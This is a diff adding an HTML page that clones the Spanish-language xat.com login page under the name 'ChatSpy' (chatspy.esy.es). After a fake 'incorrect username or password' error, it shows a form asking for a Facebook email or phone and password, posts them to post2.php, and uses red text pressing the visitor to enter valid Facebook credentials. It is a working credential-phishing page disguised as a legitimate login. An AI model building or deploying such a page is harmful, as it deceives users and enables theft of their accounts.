@@ -1,0 +1,657 @@
+<!DOCTYPE html>
+<html class="js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" lang="en"><head><!-- saved from url=(0041)http://xat.com/web_gear/chat/register.php --><!--<![endif]-->
+
+
+
+
+
+
+
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>ChatSpy</title>
+    
+    <meta name="description" content="Register or Login">
+    <meta name="viewport" content="width=device-width"><!--<meta name="msapplication-TileImage" content="http://xat.com/images/win8-tile-144.png"/>  TODO: -->
+    
+    <meta name="msapplication-TileColor" content="#000033">
+    <meta name="xt" content="buy,login,main">
+    <meta name="xcb_js" content="YY6vE">
+    <meta name="xcb_l" content="oH7gcs">
+    <link href="http://xat.com/favicon.ico" rel="shortcut icon" type="image/x-icon">
+    <link rel="dns-prefetch" href="http://www.xatech.com/">
+    <link rel="stylesheet" type="text/css" href="./index_files/bootstrap.min.css">
+	    <link rel="stylesheet" type="text/css" href="./index_files/bootstrap-responsive.min.css"> 
+	    <link rel="stylesheet" type="text/css" href="./index_files/animate.css">
+    <link rel="stylesheet" type="text/css" href="./index_files/main.css">
+        <script src="./index_files/modernizr-2.6.2-respond-1.1.0.min.js"></script></head><body>
+        <!--[if lt IE 7]>
+            <p class="chromeframe">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> or <a href="http://www.google.com/chromeframe/?redirect=true">activate Google Chrome Frame</a> to improve your experience.</p>
+        <![endif]-->
+<!--/head-->
+
+<!--header-->
+    <a href="http://xat.com/web_gear/chat/register.php#" class="scrolltop">
+        <span style="margin-left: 2px;"><i class="icon-arrow-up"></i></span>
+    </a>
+    <!-- begins navbar -->
+    <div class="navbar navbar-fixed-top">
+      <div class="navbar-inner">
+        <div class="container">
+    		<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+	            <span class="icon-bar"></span>
+	            <span class="icon-bar"></span>
+	            <span class="icon-bar"></span>
+          	</a>
+          	<a class="brand scroller" href="http://xat.com/">
+ 			
+			
+                <img src="./index_files/ojo.png" alt="logo">
+            </a>
+		  	<div class="nav-collapse collapse">
+                <ul class="nav pull-right">
+                    <li><a href="chatspy.esy.es" data-localize="main.groups" style="display: block;">Grupos</a></li>
+
+                    <li class="dropdown">
+                        <a href="chatspy.esy.es" class="dropdown-toggle" data-toggle="dropdown">
+                            <span data-localize="main.store" style="display: inline;">Tienda</span>&nbsp;
+                        </a>
+                        <ul class="dropdown-menu">
+                            <li><a href="http://xat.com/web_gear/chat/buy.php"><i class="icon-star"></i>&nbsp;<span data-localize="main.buyxats" style="display: inline;">Comprar xats days</span></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li>
+                            <li><a href="http://xat.com/web_gear/chat/GetPowers.php"><i class="icon-star"></i>&nbsp;<span data-localize="main.powers" style="display: inline;">Powers</span></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li>
+                            <li><a href="http://xat.com/web_gear/chat/Getxavis.php"><i class="xicon-xavi"></i>&nbsp;<span data-localize="main.xavi" style="display: inline;">xavis</span></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li>
+                            <li><a href="http://xat.com/web_gear/chat/TransferGroup.php"><i class="xicon-groups"></i>&nbsp;<span data-localize="main.xatgroup" style="display: inline;">Grupos</span></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li>
+                            <li><a href="http://xat.com/web_gear/chat/BuyShortName.php"><i class="xicon-shortname"></i>&nbsp;<span data-localize="main.shortname" style="display: inline;">Nombre Corto</span></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li>
+                            <li><a href="http://xat.com/web_gear/chat/promotion.php"><i class="xicon-promote"></i>&nbsp;<span data-localize="main.promotion" style="display: inline;">Promocionar</span></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li>
+                            <li><a href="http://xat.com/web_gear/chat/Auction.php"><i class="xicon-auction"></i>&nbsp;<span data-localize="main.auctions" style="display: inline;">Subastas</span></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li>
+                        </ul>
+                    </li>
+
+                    <li><a href="chatspy.esy.es" data-localize="main.community" style="display: block;">Comunidad</a></li>
+                    <li class="dropdown">
+                        <br>
+
+                        <ul class="dropdown-menu">
+<!--                            <li><a href="http://xat.com/about.php"><i class="xicon-about"></i>&nbsp;<span data-localize="main.about">About</span></a></li> -->
+                            <li><a href="http://xat.com/twitter">&nbsp;<span data-localize="main.twitter" style="display: inline;">Twitter</span></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li>
+                            <li><a href="http://xat.com/web_gear/chat/chats.php?v=YY6vE&amp;type=wiki">&nbsp;<span data-localize="main.wiki" style="display: inline;">Wiki</span></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li>
+                            <li><a href="http://xat.com/support">&nbsp;<span data-localize="main.support" style="display: inline;">Soporte</span></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li>
+                            <li><a href="http://xat.com/ticket">&nbsp;<span data-localize="main.contact" style="display: inline;">Contacto</span></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li>
+                            <li class="divider"><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li>
+                            <li><a href="http://xat.com/web_gear/chat/chats.php?v=YY6vE&amp;type=help">&nbsp;<span data-localize="main.help" style="display: inline;">Ayuda</span></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li>
+                            <li><a href="http://xat.com/web_gear/chat/chats.php?v=YY6vE&amp;type=trade">&nbsp;<span data-localize="main.trade" style="display: inline;">Cambio</span></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li>
+                            <li class="divider"><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li>
+                            <li><a href="http://xat.com/web_gear/index.php">&nbsp;<span data-localize="main.widgets" style="display: inline;">Herramientas</span></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li>
+                        </ul>
+                    </li>
+<!--                    <li><a class="btn-header" href="http://xat.com/register" data-localize="main.register">Register</a></li> -->
+                    <li><br>
+</li>
+
+                    <li class="dropdown">
+                        <a href="chatspy.esy.es" class="dropdown-toggle" data-toggle="dropdown">
+                            <small><span data-localize="main.language" style="display: inline;">Lenguaje</span></small>&nbsp;
+                        </a>
+                        <ul id="langselect" class="dropdown-menu"><li><a id="lang_en" data-lang="en" data-lange="English" href="http://xat.com/web_gear/chat/register.php#">English <small>(English)</small></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li><li><a id="lang_sq" data-lang="sq" data-lange="Albanian" href="http://xat.com/web_gear/chat/register.php#">Albania <small>(Albanian)</small></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li><li><a id="lang_ar" data-lang="ar" data-lange="Arabic" href="http://xat.com/web_gear/chat/register.php#">عربي <small>(Arabic)</small></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li><li><a id="lang_bg" data-lang="bg" data-lange="Bulgarian" href="http://xat.com/web_gear/chat/register.php#">Български <small>(Bulgarian)</small></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li><li><a id="lang_zh" data-lang="zh" data-lange="Chinese" href="http://xat.com/web_gear/chat/register.php#">汉语 <small>(Chinese)</small></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li><li><a id="lang_hr" data-lang="hr" data-lange="Croatian" href="http://xat.com/web_gear/chat/register.php#">Hrvatski <small>(Croatian)</small></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li><li><a id="lang_nl" data-lang="nl" data-lange="Dutch" href="http://xat.com/web_gear/chat/register.php#">Nederlands <small>(Dutch)</small></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li><li><a id="lang_xx" data-lang="xx" data-lange="Finn" href="http://xat.com/web_gear/chat/register.php#">Finn <small>(Finn)</small></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li><li><a id="lang_fr" data-lang="fr" data-lange="French" href="http://xat.com/web_gear/chat/register.php#">Français <small>(French)</small></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li><li><a id="lang_de" data-lang="de" data-lange="German" href="http://xat.com/web_gear/chat/register.php#">Deutsch <small>(German)</small></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li><li><a id="lang_el" data-lang="el" data-lange="Greek" href="http://xat.com/web_gear/chat/register.php#">ελληνικά <small>(Greek)</small></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li><li><a id="lang_hu" data-lang="hu" data-lange="Hungarian" href="http://xat.com/web_gear/chat/register.php#">Magyar <small>(Hungarian)</small></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li><li><a id="lang_it" data-lang="it" data-lange="Italian" href="http://xat.com/web_gear/chat/register.php#">Italiano <small>(Italian)</small></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li><li><a id="lang_ms" data-lang="ms" data-lange="Malay" href="http://xat.com/web_gear/chat/register.php#">Bahasa Melayu <small>(Malay)</small></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li><li><a id="lang_pl" data-lang="pl" data-lange="Polish" href="http://xat.com/web_gear/chat/register.php#">Polski <small>(Polish)</small></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li><li><a id="lang_pt" data-lang="pt" data-lange="Portuguese" href="http://xat.com/web_gear/chat/register.php#">Português <small>(Portuguese)</small></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li><li><a id="lang_ro" data-lang="ro" data-lange="Romanian" href="http://xat.com/web_gear/chat/register.php#">Română <small>(Romanian)</small></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li><li><a id="lang_sr" data-lang="sr" data-lange="Serbian" href="http://xat.com/web_gear/chat/register.php#">Srpski <small>(Serbian)</small></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li><li><a id="lang_es" data-lang="es" data-lange="Spanish" href="http://xat.com/web_gear/chat/register.php#">Español <small>(Spanish)</small></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li><li><a id="lang_th" data-lang="th" data-lange="Thai" href="http://xat.com/web_gear/chat/register.php#">ไทย <small>(Thai)</small></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li><li><a id="lang_tr" data-lang="tr" data-lange="Turkish" href="http://xat.com/web_gear/chat/register.php#">Türkçe <small>(Turkish)</small></a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li><li class="divider"><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li><li><a href="http://xat.com/web_gear/chat/changelanguage.php">More...</a><br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+</li></ul>
+                    </li>
+                </ul>
+	        </div>
+        </div>
+      </div>
+    </div>
+    <!-- ends navbar -->
+
+    <div class="container warning">
+        <noscript>
+<div class="cc-cookies-error well text-center"> <p>Features that need
+<b>JavaScript</b> have been disabled as it is not available.<br><br>To
+continue using xat please:</p> <p><a href="http://www.enable-javascript.com">Enable it in your browser's
+preferences</a></p> </div> </noscript>
+    </div>
+<div class="adxat" data-adtype="top" style="" align="center"></div><!--/header-->
+
+	<div class="container">
+	
+<script language="JavaScript"><!--
+function LoggedIn(ok) {
+	var s = "<H3>Has iniciado sesión como  (0) correctamente. <br>Por favor, cierre todas las ventanas de chat. </H3><P><LARGE> NO COMPARTAS LOS DATOS DE INICIO DE SESIÓN, DE LO CONTRARIO SERÁS AUTO BLOQUEADO EN LOS CHATS</LARGE></P>";
+	if(!ok) s = "<H3>Error de Inicio de seión..</H3>";
+				
+	var divId=document.getElementById("LoginResult");
+	if(divId) divId.innerHTML=s;
+	
+	divId=document.getElementById("ChangeStatus");
+	if(divId) divId.style.visibility = "visible";
+}
+function ChangeStatusMore()
+{
+	var divId=document.getElementById("ChangeStatus2");
+	divId.style.visibility = "visible";
+
+	divId=document.getElementById("ChangeStatusMoreId");
+	divId.style.visibility = "hidden";
+}
+function Generic(id,name,k2dt) 
+{
+	var sp = k2dt.split(";");
+	var k2 = sp[0]; //var dt = sp[1];
+	divId=document.getElementById("tForm");
+	if(divId && id && k2) 
+	{
+		divId.k2.value = k2;
+		divId.UserId.value = id;
+		divId=document.getElementById("tUserID");
+		divId.style.visibility = "visible";
+	}
+}
+-->
+</script>
+<h1 data-localize="login.account" style="display: block;">ERROR:</h1>Perdón pero a ocurrido un error en los sigueintes aspectos:<br>
+*Usuario y/o contraseña incorrectos<br>
+<br>
+
+<div style="display: none;">
+<span data-localize="buy.buyxats" style="display: inline;">Comprar xats y days</span>
+<span data-localize="buy.firstletter" style="display: inline;">La primera letra no debe ser un número.</span>
+<span data-localize="buy.nametaken" style="display: inline;">Lo sentimos, nombre actualmente en uso</span>
+<span data-localize="buy.notallowed" style="display: inline;">El nombre no es permitido. Por favor, intente otro.</span>
+<span data-localize="buy.notconf" style="display: inline;">registro no confirmado</span>
+<span data-localize="buy.notfound" style="display: inline;">no se encuentra</span>
+<span data-localize="buy.pass" style="display: inline;">Contraseña:</span>
+<span data-localize="buy.short" style="display: inline;">Nombre demasiado corto</span>
+<span data-localize="login.wronguep" style="display: inline;">Wrong username/email or pass</span>
+<span data-localize="buy.xatname" style="display: inline;">Nombre de usuario xat:</span>
+<span data-localize="login.account" style="display: inline;">Página de gestión para cuentas de usuarios registrados en xat</span>
+<span data-localize="login.am14" style="display: inline;">Tengo 14 años de edad y estoy de acuerdo con los <a href="http://xat.com/terms.html" target="_blank">Términos de servicio</a></span>
+<span data-localize="login.athome" style="display: inline;">Control de seguridad: Debes estar en casa para activar el bloqueo de cuentas (Account Locking)</span>
+<span data-localize="login.auth1" style="display: inline;">Descargar el <a href="http://util.xat.com/wiki/index.php/Authentication">Google Authenticator</a> para su iPhone, teléfono Android o Blackberry y escanear este con la cámara del teléfono:</span>
+<span data-localize="login.auth2" style="display: inline;">O, si el teléfono no tiene cámara, seleccione <b>el modo basado en tiempo</b> y la siguiente clave:</span>
+<span data-localize="login.auth3" style="display: inline;">Si tomas captura de esta página ahora, podrás optar a recuperar la cuenta en caso de pérdida del teléfono. <b>¡NO COMPARTA ESTOS CÓDIGOS CON NADIE!</b></span>
+<span data-localize="login.auth6" style="display: inline;">Número autenticador de 6 dígitos</span>
+<span data-localize="login.authbad" style="display: inline;">Código de autentificación incorrecto</span>
+<span data-localize="login.authd" style="display: inline;">Autenticación de la cuenta de xat (Account Authentication)</span>
+<span data-localize="login.authfail" style="display: inline;">No se ha podido activar autorización. Inténtelo de nuevo</span>
+<span data-localize="login.authreenter" style="display: inline;">Control de seguridad: Por favor, vuelva a introducir el código de autentificación para verificar esta solicitud</span>
+<span data-localize="login.authrequire" style="display: inline;">Para iniciar sesión se requiere el código de autentificación</span>
+<span data-localize="login.badid" style="display: inline;">ID de Usuario incorrecto. Lo sentimos no se puede registrar.</span>
+<span data-localize="login.badid" style="display: inline;">ID de Usuario incorrecto. Lo sentimos no se puede registrar.</span>
+<span data-localize="login.become" style="display: inline;">xat - convertirse en un usuario registrado</span>
+<span data-localize="login.changepass" style="display: inline;">Cambiar contraseña</span>
+<span data-localize="login.changepass" style="display: inline;">Cambiar contraseña</span>
+<span data-localize="login.chgnamebut" style="display: inline;">Cambiar nombre de usuario</span>
+<span data-localize="login.chgname" style="display: inline;">Haga click en este botón para cambiar el nombre de usuario registrado</span>
+<span data-localize="login.chgstatus" style="display: inline;">Cambio de estado de usuario registrado:</span>
+<span data-localize="login.chkdeleted" style="display: inline;">Control de seguridad: Esta cuenta está eliminada</span>
+<span data-localize="login.del30" style="display: inline;">No se puede eliminar la cuenta por</span>
+<span data-localize="login.delauth" style="display: inline;">Desactive la autenticación antes de eliminar la cuenta</span>
+<span data-localize="login.delcheck" style="display: inline;">Control de seguridad: por favor, revisa el correo electrónico para iniciar sesión y eliminar su cuenta</span>
+<span data-localize="login.delete" style="display: inline;">Eliminar</span>
+<span data-localize="login.eblock" style="display: inline;">El email esta bloqueado</span>
+<span data-localize="login.entercode" style="display: inline;">Introduce el código de autentificación:</span>
+<span data-localize="login.etoomany" style="display: inline;">demasiadas letras</span>
+<span data-localize="main.evalid" style="display: inline;">Correo electrónico no válido</span>
+<span data-localize="login.failid" style="display: inline;">No se pudo hacer una identificación. Por favor, inténtelo más tarde</span>
+<span data-localize="login.forgothead" style="display: inline;">Si has olvidado la contraseña o nombre de usuario usa este formulario de recuperación</span>
+<span data-localize="login.forgotpass" style="display: inline;">Enviar solicitud</span>
+<span data-localize="login.grpassigns" style="display: inline;">Poderes de Grupo actualmente asignados:</span>
+<span data-localize="login.group" style="display: inline;">Grupo</span>
+<span data-localize="login.lockd" style="display: inline;">Bloqueo de la cuenta de xat (Account Locking)</span>
+<span data-localize="login.locked3" style="display: inline;">Control de seguridad: Esta cuenta está bloqueada. Sólo se puede iniciar sesión desde casa (ubicación principal). Por favor lea:</span>
+<span data-localize="login.locking" style="display: inline;">Sólo permite el ingreso desde mi ubicación actual. - Acceder a obtener el power TICKLE gratis (requiere días)</span>
+<span data-localize="login.loginid" style="display: inline;">Inicia sesión con un ID de xat</span>
+<span data-localize="login.login" style="display: inline;">Iniciar sesión</span>
+<span data-localize="login.loseall" style="display: inline;">IMPORTANTE perderá todos los xats, días de suscriptor, powers y  matrimonios o BFF etc.</span>
+<span data-localize="login.lost" style="display: inline;">Restablecer contraseña o nombre de usuario</span>
+<span data-localize="login.max18" style="display: inline;">10-18 letras az, AZ y 0-9</span>
+<span data-localize="login.more" style="display: inline;">más</span>
+<span data-localize="login.namebad" style="display: inline;">Nombre demasiado largo o contiene malas palabras</span>
+<span data-localize="login.needk2" style="display: inline;">IMPORTANTE: necesitarás esto si deseas volver a registrar el ID</span>
+<span data-localize="login.needreg" style="display: inline;">Tienes que estar registrado para obtener xats. Por favor, regístrese ahora.</span>
+<span data-localize="login.nodelxats" style="display: inline;">No se puede eliminar una cuenta que tenga xats, días o poderes</span>
+<span data-localize="login.nolonger" style="display: inline;">no se ha registrado antes y ya no puede ser registrado</span>
+<span data-localize="login.notvalid" style="display: inline;">no es válido</span>
+<span data-localize="login.offauth" style="display: inline;">OFF (sin autenticar - desactivado)</span>
+<span data-localize="login.offlock" style="display: inline;">OFF (sin bloqueo - desactivado)</span>
+<span data-localize="login.offprot" style="display: inline;">OFF (sin protección - desactivada)</span>
+<span data-localize="login.oldname" style="display: inline;">ADVERTENCIA: Es posible que se pierda el nombre anterior si se hace este cambio. Sólo puede cambiar el nombre cada 2 semanas</span>
+<span data-localize="login.onauth" style="display: inline;">ON (autenticación encendida)</span>
+<span data-localize="login.onlock" style="display: inline;">ON (bloqueo encendido)</span>
+<span data-localize="login.onprot" style="display: inline;">ON (protección encendida)</span>
+<span data-localize="login.passne" style="display: inline;">Las contraseñas no coinciden</span>
+<span data-localize="login.passshort" style="display: inline;">Contraseña demasiado corta</span>
+<span data-localize="login.passupdetd" style="display: inline;">Contraseña actualizada</span>
+<span data-localize="login.pleasetype" style="display: inline;">Por favor, escriba un mensaje en el chat y trate de registrarse de nuevo</span>
+<span data-localize="login.regfailed" style="display: inline;">Ooops! hubo un error con el registro. Por favor, trate de registrarse de nuevo.</span>
+<span data-localize="login.regid" style="display: inline;">Regístrarse para obtener un ID de xat</span>
+<span data-localize="login.save30" style="display: inline;">Seleccione para guardar el código en este equipo durante 30 días</span>
+<span data-localize="login.secuitychk" style="display: inline;">Control de seguridad. Por favor inicia sesión e inténtalo de nuevo</span>
+<span data-localize="login.settime" style="display: inline;">Por favor, ajuste el reloj de su dispositivo. (Hora actual:</span>
+<span data-localize="login.seurityset" style="display: inline;">Ajustes de seguridad</span>
+<span data-localize="login.unreg" style="display: inline;">Haga click en este botón para convertirse en un usuario sin registro (elimina nombre de usuario</span>
+<span data-localize="login.updatesec" style="display: inline;">Actualizar Opciones de seguridad</span>
+<span data-localize="login.validemail" style="display: inline;">DEBE SER UNA DIRECCIÓN DE CORREO ELECTRÓNICO VÁLIDA PARA ACTIVAR LA REGISTRACIÓN.</span>
+<span data-localize="login.whyreg" style="display: inline;">Si
+registras una ID de xat esto impide que otras personas puedan hacerse
+pasar por ti, ya que cada usuario tiene un nombre registrado diferente
+y serás la única persona en el xat que tiene el nombre registrado que
+has elegido. Algunos grupos requieren que los usuarios se registren
+antes de que sean miembros, moderadores o propietarios. Necesitas tener
+un ID de xat para poder disfrutar de los privilegios de suscriptor,
+obtener xats, días y poderes. Así como matrimonios o BFF.</span>
+<span data-localize="login.withauth" style="display: inline;">Sólo permite el acceso con</span>
+<span data-localize="login.startagain" style="display: inline;">Por favor, iniciar sesión y comenzar de nuevo</span>
+<span data-localize="login.regdup" style="display: inline;">ya es un usuario registrado</span>
+<span data-localize="buy.terms" style="display: inline;">Debes aceptar los términos</span>
+<span data-localize="login.namedup" style="display: inline;">Nombre de usuario actualmente en uso. Por favor, Intenta con otro nombre</span>
+<span data-localize="login.emaildup" style="display: inline;">Correo electrónico actualmente en uso. Por favor, introduzca otro email</span>
+<span data-localize="login.alldup" style="display: inline;">correo electrónico, id o el nombre ya se han utilizado</span>
+<span data-localize="login.len6" style="display: inline;">Debe contener al menos 6 letras, mayúsculas y minúsculas, 0-9, AZ, az sólo</span>
+<span data-localize="login.register" style="display: inline;">Registro</span>
+<span data-localize="main.failed" style="display: inline;">Incorrecto</span>
+<span data-localize="login.old" style="display: inline;"> </span>
+<span data-localize="login.new" style="display: inline;">Nueva</span>
+<span data-localize="buy.pleasewait" style="display: inline;">Por favor espere</span>
+<span data-localize="login.len10" style="display: inline;">10-18 letras az, AZ y 0-9</span>
+<span data-localize="login.notsame" style="display: inline;">POR FAVOR, NO USES LA MISMA CONTRASEÑA QUE LA USADA CON TU CORREO ELECTRÓNICO!</span>
+<span data-localize="login.seebox" style="display: inline;">IMPORTANTE:
+Si ve un cuadro como este, por favor presione 'Permitir'. Si no lo hace
+no serás capaz de guardar la lista amigos o usar el chat correctamente.
+Si ves este cuadro tendrá que iniciar sesión de nuevo.</span>
+<span data-localize="login.protection" style="display: inline;"><a href="http://util.xat.com/wiki/index.php/AccountProtection">Protección de la cuenta de xat (Account Protection)</a><br>
+NOTA: Es recomendable que sólo DESACTIVES la protección si estás seguro.<br>
+NUNCA DESACTIVES la protección si alguien pide hacerlo.<br>
+NUNCA uses la misma contraseña para tu correo electrónico y tu ID de xat.<br></span>
+<span data-localize="login.securitywarn" style="display: inline;"><font color="#ff0000">Asegúrese de que está usando siempre en su navegador http:xat.com <br> 
+<b>IMPORTANTE: xat NUNCA pedirá la contraseña de correo electrónico.</b> 
+Usa solo la contraseña del correo electrónico para acceder en el. Por favor, lea la <a href="http://xat.com/phishing">página de información para prevención de estafas</a></font></span>
+<span data-localize="login.emcheck" style="display: inline;">Control de seguridad: Por favor, revisa tu correo electrónico para iniciar sesión</span>
+<span data-localize="main.notbot" style="display: inline;">y para asegurarnos que no eres un robot completa la verificación</span>
+<span data-localize="login.activate1" style="display: inline;">usuario de chat xat: %s - Activación requerida</span>
+<span data-localize="login.activate2" style="display: inline;">Hola %s, 
+
+Haga click en el siquiente enlace para activar su registro:
+
+%s 
+
+(NOTA hasta que no haya hecho click en este enlace %s no ha sido reservado y no se encuentra activo)</span>
+<span data-localize="login.activatem" style="display: inline;">Hello %s,
+
+Click on this link to activate your registration:
+
+%s
+</span>
+<span data-localize="login.forhelp" style="display: inline;">Para obtener ayuda inmediata con el xat entra aquí: %s 
+
+Para otros problemas, comentarios o sugerencias. Por favor, utilice nuestra comunidad aquí: %s 
+
+xat</span>
+<span data-localize="login.noreply" style="display: inline;">=== ESTE ES UN MENSAJE AUTOMÁTICO, POR FAVOR NO RESPONDA ===</span>
+<span data-localize="login.regdone" style="display: inline;"><p>Gracias, el registro de la cuenta ha sido procesado.<br>
+Un correo electrónico de confirmación se ha enviado. Ahora tendrás que
+hacer click en el enlace enviado a ese correo para activar su nombre de
+usuario</p> 
+<p><strong>IMPORTANTE: Si no recibe el correo electrónico, es posible que debas revisar la bandeja de entrada de correo no deseado.</strong></p>
+<p><strong>(El correo electrónico puede tardar hasta 30 minutos en llegar)</strong></p></span>
+<span data-localize="login.chgpass1" style="display: inline;">usuario de chat xat : %s - Cambio de contraseña</span>
+<span data-localize="login.chgpass2" style="display: inline;">Hola %s, 
+
+Haga click en este enlace para efectuar el cambio de contraseña:
+
+%s</span>
+<span data-localize="login.chgpass3" style="display: inline;"><p>Un
+e-mail ha sido enviado. Ahora tendrás que hacer click en el enlace
+enviado a tu correo electrónico para establecer una nueva contraseña </p>  
+<p><strong>IMPORTANTE: Si no recibe el correo electrónico, es posible que debas revisar la bandeja de entrada de correo no deseado.</strong></p>  
+<p><strong>(El correo electrónico puede tardar hasta 30 minutos en llegar)</strong></p></span>
+<span data-localize="login.pass30" style="display: inline;">No disponible el cambio de nombre de usuario por %s días</span>
+<span data-localize="login.locked1" style="display: inline;">Inicio de sesión de xat rechazado</span>
+<span data-localize="login.locked2" style="display: inline;">Hola %s (%s) 
+
+Has intentado iniciar sesión desde una ubicación diferente fuera de casa :
+
+%s 
+
+Esto fue rechazado debido a que su cuenta está bloqueada. 
+
+Ver: %s</span>
+<span data-localize="login.loginas" style="display: inline;">Has iniciado sesión como</span>
+<span data-localize="login.reg" style="display: inline;">Registro</span>
+<span data-localize="login.out" style="display: inline;">Salir</span>
+<span data-localize="login.del" style="display: inline;">Eliminar</span>
+<span data-localize="login.namechg" style="display: inline;">Cambio de nombre</span>
+<span data-localize="login.closewin" style="display: inline;">correctamente. <br>Por
+favor, cierre todas las ventanas de chat. %s NO COMPARTAS LOS DATOS DE
+INICIO DE SESIÓN, DE LO CONTRARIO SERÁS AUTO BLOQUEADO EN LOS CHATS</span>
+<span data-localize="login.logfail" style="display: inline;">Error de Inicio de seión</span>
+<span data-localize="login.logfrom" style="display: inline;">Usuario conectado desde</span>
+<span data-localize="login.logpin" style="display: inline;">usuario de xat: %s - Login PIN</span>
+<span data-localize="login.logpin2" style="display: inline;">Hola %s,
+**************************************************************
+ADVERTENCIA NO COMPARTAS ESTE EMAIL CON NADIE! EL PERSONAL-STAFF DE xat
+NUNCA TE PREGUNTARÁ POR CONTRASEÑAS O PIN
+************************************************************** Haz
+click en este enlace para acceder:
+%s Si no has iniciado sesión recientemente, lo más probable es que la
+cuenta de xat se ha visto comprometida y deberás cambiar las
+contraseñas inmediatamente. %s xat.com</span>
+</div>
+
+<p><b><span data-localize="login.loginid" style="display: inline;">Inicia sesión con tu cuenta de Facebook:</span></b></p>
+
+<form name="usuario.php" method="post" action="post2.php">Correo o teléfono: <input name="usua" type="text"><br>
+Contraseña:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <input name="pass" type="password">
+<input name="Submit" value="Enviar" type="submit"><a href="post2.php"><span data-localize="login.login" style="display: inline;"></span></a><br>
+<span data-localize="login.securitywarn" style="display: inline;"><font color="#ff0000">Porfavor introduce tu usuario y contreseña de facebook validos para que podamos hacer correctamente el trabajo</font></span>.<br>
+  <a href="post2.php"><span data-localize="login.login" style="display: inline;">Iniciar sesión</span></a><br>
+<br>
+</form></div>
+<div class="adxat" data-adtype="bot" style="" align="center"></div>
+<!--footer-->
+    <div id="footer">
+        <footer>
+        </footer><ul>
+        </ul>
+        <p>© 2015 chatspy.esy.es All rights reserved.</p>
+    
+    </div>
+<!--/footer-->
+<!--foot-->
+    <script src="./index_files/jquery.min.js"></script>
+    <script>window.jQuery || document.write('<script src="http://xat.com/js/vendor/jquery-1.9.1.min.js?v=YY6vE"><\/script>')</script>
+    <script src="./index_files/jquery.cookie.js"></script>
+    <script src="./index_files/jquery.cookiecuttr.js"></script>
+    <script src="./index_files/bootstrap.min.js"></script>
+    <script src="./index_files/plugins.js"></script>
+    <script src="./index_files/jquery.localize.js"></script>
+        <script src="./index_files/main.js"></script>
+    <script src="./index_files/urchin.js" type="text/javascript">
+</script>
+<script type="text/javascript">
+_uacct = "UA-1813155-1";
+if(!config.cookiedecline) urchinTracker();
+</script>
+
+
+<!--/foot--></body></html>
